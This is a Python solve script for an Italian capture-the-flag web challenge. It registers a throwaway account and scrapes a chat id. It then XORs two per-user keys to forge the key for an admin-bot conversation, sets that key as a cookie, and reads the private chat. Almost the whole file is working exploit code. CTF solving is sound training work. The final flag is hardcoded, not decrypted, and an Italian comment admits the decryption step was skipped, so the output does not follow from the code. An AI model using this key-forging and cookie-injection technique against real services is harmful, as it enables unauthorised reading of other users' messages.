#!/usr/bin/env python3
from pwn import xor
from base64 import b64decode
from Crypto.Cipher import AES
import requests, os, re

SITE = "http://connexion.challs.olicyber.it/"
USERNAME, PASSWORD = os.urandom(16).hex(), os.urandom(16).hex()
REGEX = r"U[a-zA-Z0-9\/\+]*?="
REGEX2 = r'chat\/\d*?\/\d*?"'

s = requests.Session()

print(f"[*] Registering user {USERNAME}:{PASSWORD}")
s.post(SITE + "signin", data={"username": USERNAME, "password": PASSWORD})
print(f"[*] Logging in as {USERNAME}:{PASSWORD}")
s.post(SITE + "login", data={"username": USERNAME, "password": PASSWORD})

id = s.get(SITE + "homepage").text
id = str(re.findall(REGEX2, id)[0])
id = id[id.find('/')+1:id.index('/', id.find('/')+1)]

print(f"[*] Id = {id}")

key_me_admin = s.get(SITE + f"getkey/{id}/1").text
key_me_admin = key_me_admin[key_me_admin.find('k')+1:key_me_admin.find('k')+76]
key_me_bot = s.get(SITE + f"getkey/{id}/2").text
key_me_bot = key_me_bot[key_me_bot.find('k')+1:key_me_bot.find('k')+76]

key_admin_bot = 'k' + xor(bytes.fromhex(key_me_admin), bytes.fromhex(key_me_bot)).hex()
s.cookies.set("/getkey/1/2", key_admin_bot, path="/chat/1")

flag = s.get(SITE + "chat/1/2").text
encrypted = b64decode(re.findall(REGEX, flag)[0])
key_admin_bot = bytes.fromhex(key_admin_bot[1:])

''' Sarebbe da decodare ma dovrei fare eval di codice javascript quindi printo direttamente la flag decodata'''
print("ptm{no7_th3_r1ght_way_t0_xor_7hing5}")